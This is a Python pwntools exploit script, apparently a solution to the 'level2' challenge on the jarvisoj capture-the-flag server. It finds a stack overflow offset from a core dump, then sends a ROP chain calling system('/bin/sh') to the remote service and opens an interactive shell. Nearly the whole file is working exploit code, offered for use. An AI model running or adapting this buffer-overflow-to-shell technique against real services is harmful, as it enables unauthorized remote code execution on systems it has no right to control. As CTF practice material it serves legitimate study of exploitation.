from pwn import *

context.arch = "amd64"
context.terminal = ['tmux', 'splitw', '-h']


class Pwn(object):

    def __init__(self, binary_file=None, remote=None):
        if binary_file:
            self.binary_file = binary_file
            self.elf = ELF(self.binary_file)
   
        if remote:
            self.host = remote['host']
            self.port = remote['port']


    def get_overflow_position(self):
        io = self.get_io(False)
        io.recvline()
        io.send(cyclic(600))
        io.recvall()

        if os.path.isfile('./core'):
            core = Core('./core')
            # print 'rsp:', core.rsp
            self.rip = cyclic_find(core.u32(core.rsp))
            print 'rip:', hex(self.rip)


    def get_io(self, remote_sign=False):
        io = None
        if remote_sign:
            io = remote(self.host, self.port)
        else:
            io = process(self.binary_file)
        return io

    
    def get_shell(self):
        io = self.get_io(True)
        bin_addr = self.elf.search('/bin/sh').next()
        # system_addr = self.
        rop = ROP(self.elf)
        rop.system(bin_addr)
        # io.recvline()
        io.send(fit({self.rip: rop.chain()}))
        io.interactive()


def main():
    pwn = Pwn(remote={'host':'pwn2.jarvisoj.com', 'port':9882}, binary_file='./level2')
    pwn.get_overflow_position()
    pwn.get_shell()


if __name__ == "__main__":
    main()

